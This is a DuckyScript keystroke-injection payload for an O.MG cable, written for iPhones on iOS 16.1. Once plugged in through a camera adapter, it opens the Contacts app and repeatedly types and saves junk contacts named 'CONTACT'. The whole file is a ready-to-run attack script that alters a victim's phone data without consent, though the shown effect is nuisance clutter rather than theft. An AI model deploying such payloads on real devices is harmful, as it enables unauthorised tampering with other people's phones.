REM Version 1.1
REM OS: iOS
REM Author: Peaakss
REM Description: This payload adds 28 new contacts with just first names to the iPhone
REM NOITCE Payload was made on iOS 16.1 - iPhone | Timing may have have to be changed based on version/model
REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, ative end of the O.MG cable must be plugged into the end of the adapter

DEFINE #CONTACT CONTACT

GUI h
DELAY 500
GUI SPACE
DELAY 1000
STRING Contacts
DELAY 250
ENTER
DELAY 2500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI n
DELAY 500
STRING #CONTACT
DELAY 500 
GUI s
DELAY 500
GUI [
